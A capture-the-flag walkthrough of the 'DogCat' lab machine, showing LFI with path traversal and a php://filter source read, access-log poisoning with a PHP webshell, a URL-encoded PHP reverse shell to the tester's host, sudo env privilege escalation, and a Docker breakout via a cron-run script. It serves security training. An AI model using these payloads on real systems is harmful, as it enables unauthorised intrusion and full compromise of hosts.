DogCat

Target IP: 10.10.162.242
Challenge Description:

Reconnaissance


There are two TCP ports open on the target machine, as shown above. There is SSH and HTTP applications open.


Performing an aggressive port scan against the open TCP ports returns the result above. The HTTP application is located at port 80. I will start enumeration with this port.


Running whatweb against the HTTP application returns the technology above used by the target machine.

Enumeration

Port 80: HTTP

Browsing to the web application on port 80 displays the webpage above. I notice there are two buttons: A dog and A cat. The buttons are clickable.


I pressed the button with the label A cat and the web application displayed a picture of a cat as shown above. The URL is also interesting as it contains the parameter view. Maybe I can perform LFI/RFI using this parameter?


I tried to access the access.log using the parameter view, but I had no luck. I received the error message above. There is some sort of filtering in place.


And using the payload dog/../../../../../../../var/log/apache2/access.log, I managed to obtain the useful error result above. According to the message above, the web application appends .php automatically. Maybe I can use %00 to stop the web application from adding the .php extension.


But it did not work. I tried using dog/../../../../../../../var/log/apache2/access.log%00, but I was unable to do so.


Since the web application automatically appends the .php, I used the payload http://10.10.162.242/?view=php://filter/convert.base64-encode/resource=cat/../index to read the content of the index page. I obtained the content in base64.


I decoded the base64 string and obtained the source-code above. The highlighted code above is interesting, as there is additional parameter called ext. This parameter is responsible for adding the .php if nothing has been passed; otherwise, it can be left empty.


And I successfully obtained the access.log as shown above from /var/log/apache2 directory by using the payload cat/../../../../../../../var/log/apache2/access.log&ext. Time to poison it.

Exploitation


Using Burpsuite, I intercepted a HTTP request to the index.php page on the target machine. Then I modified the User-Agent header field and replaced it with my PHP webshell script <?php echo system($_GET['cmd']); ?>, as shown above. Then I successfully sent it to the web server.


After poisoning the access.log file, I sent the commands id;whoami;ls;ps and received the output highlighted above. Now I can perform RCE on the target machine. Time to leverage this to a reverse shell connection.


I started a listener on my machine at port 8443. And bingo! Using the poisoned log file, I deployed the URL-encoded PHP reverse shell script php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. Then I received a reverse shell connection from the target machine on my machine at port 8443 with the session as www-data, as shown above. I tried to upgrade my shell to a Python tty shell, but it looks like the target machine does not have Python installed.

Privilege Escalation


Running ls -la at / shows this is a docker machine. I will need to breakout of this docker machine.


I executed the command sudo -l and received the output above. I can execute the command /usr/bin/env as the user root without password.


I successfully used the command sudo env /bin/sh to gain a root shell. But I still need to breakout of the docker container.


After some manual enumeration, I found the two interesting files shown above at /opt/backups.


The file backup.sh seems to perform backup from the shared folder of the host machine and the docker container. Since I have read & write permissions over this file, I can overwrite it.


I inserted my bash reverse shell script inside the backup.sh file as shown above. Then I changed the permission to be executable. After, I started a listener on my machine at port 8444. If this is a cronjob, then I should receive a root shell on my machine at port 8444.


And bingo! I successfully obtained a root shell on port 8444. I also managed to breakout of the docker container.
